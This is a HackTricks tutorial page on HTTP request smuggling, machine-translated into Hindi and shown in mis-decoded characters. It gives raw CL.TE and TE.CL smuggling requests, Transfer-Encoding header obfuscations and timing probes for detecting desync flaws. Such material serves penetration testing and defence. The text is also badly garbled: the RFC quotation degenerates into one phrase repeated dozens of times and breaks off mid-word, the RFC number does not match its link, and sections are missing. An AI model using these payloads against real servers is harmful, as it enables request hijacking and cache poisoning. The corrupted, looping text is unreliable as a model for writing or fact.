# HTTP Request Smuggling / HTTP Desync Attack

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдПрдХ **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ PR рдЬрдорд╛ рдХрд░рдХреЗред**

</details>

## рдХреНрдпрд╛ рд╣реИ

рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рджреБрд░реНрдмрд▓рддрд╛ рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИ рдЬрдм **рдлреНрд░рдВрдЯ-рдПрдВрдб рдкреНрд░реЙрдХреНрд╕реА** рдФрд░ **рдмреИрдХ-рдПрдВрдб** рд╕рд░реНрд╡рд░ рдХреЗ рдмреАрдЪ рдПрдХ **рдЕрд╕рдордпреАрдХрд░рдг** рд╣реЛрддрд╛ рд╣реИ рдЬреЛ рдПрдХ **рд╣рдорд▓рд╛рд╡рд░** рдХреЛ рдПрдХ HTTP **рдЕрдиреБрд░реЛрдз** рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬреЛ **рдлреНрд░рдВрдЯ-рдПрдВрдб** рдкреНрд░реЙрдХреНрд╕реА (рд▓реЛрдб рдмреИрд▓реЗрдВрд╕ / рдкреНрд░рддрд┐рд░реЛрдз-рдкреНрд░реЙрдХреНрд╕реА) рджреНрд╡рд╛рд░рд╛ **рдПрдХрд▓ рдЕрдиреБрд░реЛрдз** рдХреЗ рд░реВрдк рдореЗрдВ **рд╡реНрдпрд╛рдЦреНрдпрд╛** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ **рдмреИрдХ-рдПрдВрдб** рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ **2 рдЕрдиреБрд░реЛрдз** рдХреЗ рд░реВрдк рдореЗрдВ **рд╡реНрдпрд╛рдЦреНрдпрд╛** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред\
рдЗрд╕рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЕрдкрдиреЗ рдХреЗ рдмрд╛рдж рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рд╡рд╛рд▓реЗ рдЕрдЧрд▓реЗ рдЕрдиреБрд░реЛрдз рдХреЛ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред

### рд╕рд┐рджреНрдзрд╛рдВрдд

[**RFC рдирд┐рд░реНрдзрд╛рд░рдг (2161)**](https://tools.ietf.org/html/rfc2616)

> рдпрджрд┐ рдПрдХ рд╕рдВрджреЗрд╢ рдХреЛ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрджреЗрд╢ рдореЗрдВ рдПрдХ рд╣реА рд╕рдВрдж
### TE.CL рдЧрд╝реИрд░рд╕реБрд░рдХреНрд╖рд┐рддрддрд╛

рдпрд╣рд╛рдБ, рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕рд░реНрд╡рд░ `Transfer-Encoding` рд╣реИрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ `Content-Length` рд╣реИрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░реАрдХреЗ рд╕реЗ рдПрдХ рд╕рд░рд▓ HTTP рдЕрдиреБрд░реЛрдз рдзрд╛рд░рдгрд╛ рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 4`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `7b`\ `GET /404 HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 30`\``\
`x=`\
`0`\
`\`

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ **рд░рд┐рд╡рд░реНрд╕-рдкреНрд░реЙрдХреНрд╕реА** рдмреИрдХ-рдПрдВрдб рдХреЛ **`Transfer-encoding`** рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреЗ рдХрд╛рд░рдг **рдкреВрд░рд╛ рдЕрдиреБрд░реЛрдз** рднреЗрдЬреЗрдЧрд╛ред рд▓реЗрдХрд┐рди, **рдмреИрдХ-рдПрдВрдб** рдХреЗрд╡рд▓ **`7b`** (4 рдмрд╛рдЗрдЯ) рдХреЛ рд╣реА **рдкреНрд░реЛрд╕реЗрд╕** рдХрд░реЗрдЧрд╛ рдЬреИрд╕рд╛ рдХрд┐ `Content-Length` рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдЕрдЧрд▓рд╛ рдЕрдиреБрд░реЛрдз `GET /404 HTTP/1.1` рд╕реЗ рд╢реБрд░реВ рд╣реЛрдЧрд╛ред

_рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╣рдорд▓рд╛ рдПрдХ `0` рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЕрдЧрд▓рд╛ рдЕрдиреБрд░реЛрдз **x** рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд рдорд╛рдиреЛрдВ рдХреЗ рд░реВрдк рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЬрд╛рдПрдЧрд╛ред_\
_рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдПрдореНрдмреЗрдбреЗрдб рдЕрдиреБрд░реЛрдз рдХреА Content-Length рдЕрдЧрд▓реЗ рдЕрдиреБрд░реЛрдз рдХреА рд▓рдВрдмрд╛рдИ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░реЗрдЧреА рдЬреЛ **x** рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЬрд╛рдПрдЧрд╛ред рдпрджрд┐ рдпрд╣ рдмрд╣реБрдд рдЫреЛрдЯрд╛ рд╣реИ, рддреЛ рдХреБрдЫ рдмрд╛рдЗрдЯ рд╣реА рдЬреЛрдбрд╝реЗ рдЬрд╛рдПрдВрдЧреЗ, рдФрд░ рдпрджрд┐ рдпрд╣ рдмрд╣реБрдд рдмрдбрд╝рд╛ рд╣реИ (рдЕрдЧрд▓реЗ рдЕрдиреБрд░реЛрдз рдХреА рд▓рдВрдмрд╛рдИ рд╕реЗ рдмрдбрд╝рд╛ рд╣реИ) рддреЛ рдЕрдЧрд▓реЗ рдЕрдиреБрд░реЛрдз рдХреЗ рд▓рд┐рдП рддреНрд░реБрдЯрд┐ рдЙрдареЗрдЧреАред_

### TE.TE рдЧрд╝реИрд░рд╕реБрд░рдХреНрд╖рд┐рддрддрд╛

рдпрд╣рд╛рдБ, рдлреНрд░рдВрдЯ-рдПрдВрдб рдФрд░ рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ рджреЛрдиреЛрдВ `Transfer-Encoding` рд╣реИрдбрд░ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдЗрдирдореЗрдВ рд╕реЗ рдХреЛрдИ рдПрдХ рд╕рд░реНрд╡рд░ рд╣реЗрдбрд░ рдХреЛ рдХрд┐рд╕реА рддрд░реАрдХреЗ рд╕реЗ рдЕрд╡рд░реЛрдзрд┐рдд рдХрд░рдХреЗ рдЗрд╕реЗ рдкреНрд░реЛрд╕реЗрд╕ рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ рд╣реИред\
`Transfer-Encoding` рд╣реИрдбрд░ рдХреЛ рдЕрд╡рд░реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрд╕реАрдорд┐рдд рддрд░реАрдХреЗ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

`Transfer-Encoding: xchunked`\
``\ `Transfer-Encoding : chunked`\``\
`Transfer-Encoding: chunked`\
`Transfer-Encoding: x`\
``\ `Transfer-Encoding: chunked`\ `Transfer-encoding: x`\``\
`Transfer-Encoding:[tab]chunked`\
``\ `[space]Transfer-Encoding: chunked`\``\
`X: X[\n]Transfer-Encoding: chunked`\
\`\`\
`Transfer-Encoding`\
`: chunked`

**TE** рд╣реЗрдбрд░ рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдирд╣реАрдВ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕рд░реНрд╡рд░ (рд░рд┐рд╡рд░реНрд╕-рдкреНрд░реЙрдХреНрд╕реА рдпрд╛ рдмреИрдХ-рдПрдВрдб) рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рдЖрдкрдХреЛ рдПрдХ **CL.TE рдЧрд╝реИрд░рд╕реБрд░рдХреНрд╖рд┐рддрддрд╛** рдпрд╛ **TE.CL рдЧрд╝реИрд░рд╕реБрд░рдХреНрд╖рд┐рддрддрд╛** рдорд┐рд▓реЗрдЧреАред

## HTTP рдЕрдиреБрд░реЛрдз рдзрд╛рд░рдгрд╛ рдЦреЛрдЬрдирд╛

### рд╕рдордп рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ CL.TE рдЧрд╝реИрд░рд╕реБрд░рдХреНрд╖рд┐рддрддрд╛ рдЦреЛрдЬрдирд╛

рдпрджрд┐ рдХреЛрдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рди CL.TE рд╡реЗрд░рд┐рдПрдВрдЯ рдХреЗ рдЕрдиреБрд░реЛрдз рдзрд╛рд░рдгрд╛ рдХреЗ рд▓рд┐рдП рд╕реБрд░рдХреНрд╖рд┐рддрддрд╛ рдХреЗ рдкреНрд░рддрд┐ рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рд╣реИ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░рд╣ рдХрд╛ рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ рд╕реЗ рдЕрдХреНрд╕рд░ рд╕рдордп рдореЗрдВ рджреЗрд░реА рд╣реЛрдЧреА:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
рдпрджрд┐ рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕рд░реНрд╡рд░ `Content-Length` рд╣реИрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдХреЗрд╡рд▓ рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХрд╛ рдПрдХ рд╣рд┐рд╕реНрд╕рд╛ рдЖрдЧреЗ рднреЗрдЬреЗрдЧрд╛, `0` рдХреЛ рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реИред рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ `Transfer-Encoding` рд╣реИрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдкрд╣рд▓реЗ рдЪрдВрдХ рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдлрд┐рд░ рдЕрдЧрд▓реЗ рдЪрдВрдХ рдХреА рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд╕реЗ рдПрдХ рджреГрд╢реНрдпрдорд╛рди рд╕рдордп рджреЗрд░реА рд╣реЛрдЧреАред

рдХрднреА-рдХрднреА, рдЯрд╛рдЗрдордЖрдЙрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдмрдЬрд╛рдп, рдЖрдкрдХреЛ рдЕрдВрддрд┐рдо рд╣реЛрд╕реНрдЯ рд╕реЗ 400 рдмреЗрдб рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рдЬрд╣рд╛рдВ рдПрдХ CL.TE рдкреЗрд▓реЛрдб рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ:

![](<../../.gitbook/assets/image (444).png>)

рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╢рд░реАрд░ рдореЗрдВ рдПрдХ рддреНрд░реБрдЯрд┐ рд╕рд╣рд┐рдд рдПрдХ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рд╣реИрдкреНрд░реЛрдХреНрд╕реА рдХреЗ рдЙрдкрдпреЛрдЧ рдХреА рд╕рдВрд╕реНрдХрд░рдг рднреА рд╣реЛрддреА рд╣реИ:

![](<../../.gitbook/assets/image (443).png>)

### рдЯрд╛рдЗрдорд┐рдВрдЧ рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ TE.CL рд╕рдВрдмрдВрдзреА рд╕реБрд░рдХреНрд╖рд╛ рджреБрд░реБрдкрдпреЛрдЧ рдЦреЛрдЬрдирд╛

рдпрджрд┐ рдХреЛрдИ рдПрдкреНрд▓рд┐рдХреЗрд╢рди TE.CL рдкреНрд░рдХрд╛рд░ рдХреЗ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рд╕реНрдордЧрд▓рд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рд╣реИ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░рд╣ рдХрд╛ рдПрдХ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рднреЗрдЬрдиреЗ рд╕реЗ рдЕрдХреНрд╕рд░ рд╕рдордп рджреЗрд░реА рд╣реЛрдЧреА:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
### рдкреНрд░рдердо-рдЕрдВрдд рд╕рд░реНрд╡рд░ `Transfer-Encoding` рд╣реИрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдХреЗрд╡рд▓ рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХрд╛ рдПрдХ рд╣рд┐рд╕реНрд╕рд╛ рдЖрдЧреЗ рднреЗрдЬреЗрдЧрд╛, `X` рдХреЛ рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реИред рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ `Content-Length` рд╣реИрдбрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рд╕рдВрджреЗрд╢ рд╢рд░реАрд░ рдореЗрдВ рдЕрдзрд┐рдХ рд╕рд╛рдордЧреНрд░реА рдХреА рдЙрдореНрдореАрдж рдХрд░рддрд╛ рд╣реИ, рдФрд░ рд╢реЗрд╖ рд╕рд╛рдордЧреНрд░реА рдХреА рдкрд╣реБрдВрдЪ рдХреЗ рд▓рд┐рдП рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд╕реЗ рдПрдХ рджреГрд╢реНрдпрдорд╛рди рд╕рдордп рджреЗрд░реА рд╣реЛрдЧреАред

### HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛

рдЬрдм рдЖрдкрдиреЗ рдкрд╛рдпрд╛ рд╣реИ рдХрд┐ **рд╕рдордп рддрдХрдиреАрдХ рдХрд╛рдо рдХрд░ рд░рд╣реА рд╣реИрдВ**, рддреЛ рдЖрдкрдХреЛ рдпрд╣ рдкреНрд░реЛрдм рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ рдЖрдк рдЕрдиреНрдп рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ **рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред\
рдЗрд╕реЗ рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рдпрд╣ рд╣реИ рдХрд┐ рдЖрдк рдЕрдкрдиреЗ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рджреВрд╖рд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ, **рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП `/` рдХреЗ рд▓рд┐рдП рдПрдХ 404 рд▓реМрдЯрд╛рдПрдВ**ред\
[рдореВрд▓ рдЙрджрд╛рд╣рд░рдгреЛрдВ](./#basic-examples) рдореЗрдВ рд╣рдордиреЗ рдкрд╣рд▓реЗ рд╣реА `CL.TE` рдФрд░ `TE.CL` рдЙрджрд╛рд╣рд░рдг рджреЗрдЦреЗ рд╣реИрдВ, рдЬрд╣рд╛рдВ рдПрдХ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рдЕрдиреБрд░реЛрдз рдХреЛ рджреВрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `/404` рдХреЗ рд▓рд┐рдП рдкреВрдЫрддрд╛рдЫ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ 404 рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдЙрддреНрдкрдиреНрди рдХреА рдЧрдИ рдереА рдЬрдм рдХреНрд▓рд╛рдЗрдВрдЯ рдХрд┐рд╕реА рдЕрдиреНрдп рд╕рдВрд╕рд╛рдзрди рдХреЗ рд▓рд┐рдП рдкреВрдЫ рд░рд╣рд╛ рдерд╛ред

**рдиреЛрдЯ**

рдЕрдиреНрдп рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рд╕рд╛рде рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд░рдХреЗ рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рд╕рдВрдмрдВрдзреА рджреБрд░реНрдЧрдорддрд╛ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреЗ рд╕рдордп рдХреБрдЫ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╡рд┐рдЪрд╛рд░реЛрдВ рдХреЛ рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦрдирд╛ рдЪрд╛рд╣рд┐рдП:

